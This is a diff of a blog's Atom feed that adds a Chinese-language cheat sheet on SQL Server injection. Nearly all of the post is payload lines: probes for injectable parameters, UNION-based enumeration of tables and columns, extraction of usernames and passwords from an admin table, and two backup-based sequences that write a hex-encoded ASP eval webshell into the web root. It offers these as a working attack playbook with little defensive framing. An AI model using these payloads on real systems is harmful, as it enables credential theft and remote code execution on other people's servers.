@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2016-09-27T14:39:40.680Z</updated>
+  <updated>2016-10-09T01:42:37.278Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -14,6 +14,53 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>SQL server注入</title>
+    <link href="http://yoursite.com/2016/10/09/SQL-server%E6%B3%A8%E5%85%A5/"/>
+    <id>http://yoursite.com/2016/10/09/SQL-server注入/</id>
+    <published>2016-10-09T01:10:57.000Z</published>
+    <updated>2016-10-09T01:42:37.278Z</updated>
+    
+    <content type="html"><![CDATA[<p>sql注入攻击本质：把用户输入的数据当代码使用<br>攻击请求向量：分为GET POST Cookie<br>数据类型：整型，字符型，搜索型<br>显示数据方法：</p>
+<ul>
+<li>显错注入</li>
+<li>盲注（布尔注入，延时，报错，联合查询，堆查询，DNS查询）</li>
+</ul>
+<a id="more"></a>
+<h4 id="注入点判断"><a href="#注入点判断" class="headerlink" title="注入点判断"></a>注入点判断</h4><p>interger：<br>id=1-0 正常<br>id=1-1  出错<br>string：<br>and ‘a’=’a’ 正常<br>and ‘a’=’b’ 出错</p>
+<h4 id="数据库判断"><a href="#数据库判断" class="headerlink" title="数据库判断"></a>数据库判断</h4><p>and exists(select @@version)–</p>
+<h4 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h4><p>Order by 5 –     </p>
+<h4 id="判断字段数据类型"><a href="#判断字段数据类型" class="headerlink" title="判断字段数据类型"></a>判断字段数据类型</h4><p>union all select NULL,NULL,NULL,NULL,NULL–<br>union all select NULL,NULL,’ test’ ,NULL,NULL–<br>正常说明第3字段为字符型可以显示SQL注入数据。</p>
+<h4 id="显示数据库版本"><a href="#显示数据库版本" class="headerlink" title="显示数据库版本"></a>显示数据库版本</h4><p>and 1=2 union all select NULL,NULL,@@version,NULL,NULL–</p>
+<h4 id="显示当前库名"><a href="#显示当前库名" class="headerlink" title="显示当前库名"></a>显示当前库名</h4><p>and 1=2 union all select NULL,db_name(),NULL,NULL,NULL from sysobjects–</p>
+<h4 id="显示指定库的表名"><a href="#显示指定库的表名" class="headerlink" title="显示指定库的表名"></a>显示指定库的表名</h4><p>and 1=2 union all select NULL,(select top 1 name from 库名..sysobjects where xtype=’u’ and name not in(select top 0 name from 库名..sysobjects where xtype=’u’)),NULL,NULL,NULL from sysobjects–</p>
+<h4 id="显示当前库的表名"><a href="#显示当前库的表名" class="headerlink" title="显示当前库的表名"></a>显示当前库的表名</h4><p>and 1=2 union all select NULL,(select top 1 name from sysobjects where xtype=’u’ and name not in(select top 0 name from sysobjects where xtype=’u’)),NULL,NULL,NULL from sysobjects–    </p>
+<p>and 1=2 union all select NULL,(select top 1 name from sysobjects where xtype=’u’ and name not in(select top 1 name from sysobjects where xtype=’u’)),NULL,NULL,NULL from sysobjects–<br>//查询表名(从0开始增加第二个top N的数字就可以遍历当前数据库表名了。</p>
+<h4 id="显示字段名"><a href="#显示字段名" class="headerlink" title="显示字段名"></a>显示字段名</h4><p>and 1=2 union all select NULL,(select top 1 name from syscolumns where id in (select id from sysobjects where name=’admin’) and name not in (select top 1 name from syscolumns where id in (select id from sysobjects where name=’admin’))),NULL,NULL,NULL from sysobjects–    </p>
+<p>and 1=2 union all select NULL,(select top 1 name from syscolumns where id in (select id from sysobjects where name=’admin’) and name not in (select top 2 name from syscolumns where id in (select id from sysobjects where name=’admin’))),NULL,NULL,NULL from sysobjects–<br>从0开始增加第二个top N的数字就可以遍历admin表的字段名了</p>
+<h4 id="显示字段值"><a href="#显示字段值" class="headerlink" title="显示字段值"></a>显示字段值</h4><p>and 1=2 union all select id,username,password,NULL,NULL from admin–</p>
+<h4 id="webshell写入"><a href="#webshell写入" class="headerlink" title="webshell写入"></a>webshell写入</h4><p>数据库与 Web 分离判断：<br>网站主机名:select host_name(); 数据库主机名:select @@servername;<br>如果未分离可以写入 shell</p>
+<h5 id="日志备份"><a href="#日志备份" class="headerlink" title="日志备份"></a>日志备份</h5><p>;DROP TABLE cmd–<br>;ALTER DATABASE 库名 SET RECOVERY FULL–<br>;CREATE TABLE cmd (a IMAGE)–<br>;BACKUP DATABASE 库名 TO DISK = ‘c:\progra~1\1.bak’ WITH INIT–<br>;INSERT INTO cmd (a) VALUES(0x3c256576616c207265717565737428224d482229253e)–<br>;BACKUP DATABASE 库名 TO DISK = ‘C:\Inetpub\wwwroot\shell.asp’–<br>;DROP TABLE cmd–</p>
+<h5 id="差异备份"><a href="#差异备份" class="headerlink" title="差异备份"></a>差异备份</h5><p>;drop table cmd–<br>;backup database testdb to disk =’c:\progra~1\sq.bak’–<br>;create table cmd(a image)–<br>;insert into cmd(a) values(0x3c256576616c20726571756573742822746f6d2229253e)–<br>;backup database testdb to disk=’C:\Inetpub\wwwroot\sq.asp’ with differential,format–<br>;drop table cmd–</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;sql注入攻击本质：把用户输入的数据当代码使用&lt;br&gt;攻击请求向量：分为GET POST Cookie&lt;br&gt;数据类型：整型，字符型，搜索型&lt;br&gt;显示数据方法：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;显错注入&lt;/li&gt;
+&lt;li&gt;盲注（布尔注入，延时，报错，联合查询，堆查询，DNS查询）&lt;/li&gt;
+&lt;/ul&gt;
+    
+    </summary>
+    
+      <category term="渗透" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"/>
+    
+    
+      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
   
   <entry>
     <title>webinspect扫描器</title>
